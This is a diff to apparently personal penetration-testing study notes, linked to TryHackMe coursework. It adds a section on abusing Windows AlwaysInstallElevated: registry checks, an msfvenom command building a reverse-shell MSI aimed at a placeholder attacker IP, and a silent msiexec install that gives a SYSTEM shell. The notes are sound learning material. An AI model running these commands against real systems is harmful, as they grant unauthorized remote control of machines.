@@ -246,6 +246,32 @@ LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.py
 
 By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn’t work, however, if you’re trying to replace a program in Program Files (x86). In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.
 
+### Malicious MSI Files
+
+If `AlwaysInstallElevated`  is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.
+
+```powershell
+reg query \
+	HKCU\Software\Policies\Microsoft\Windows\Installer
+
+reg query \
+	HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+Generate a malicious MSI file with msfvenom:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp \
+	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
+		-f msi -o $INSTALLER.msi
+```
+
+Then install on the target to get a shell:
+
+```powershell
+msiexec /quiet /qn /i $INSTALLER.msi
+```
+
 ### Catching Shells
 
 Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
@@ -275,8 +301,9 @@ Use the `exploit/multi/handler` module in Metasploit to catch the shells produce
 * [2022-04-14 TryHackMe: Jr. Penetration Tester](../log/2022-04-14-tryhackme-jr-penetration-tester.md)
 * [2022-04-18 ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-04-18-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
 * [Using Mimikatz](mimikatz.md)
+* [2022-04-21 TryHackMe: Jr. Penetration Tester](../log/2022-04-21-tryhackme-jr-penetration-tester.md)
 
 - - - -
 
 <span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> April 18, 2022
+<span aria-hidden="true">📅</span> April 22, 2022
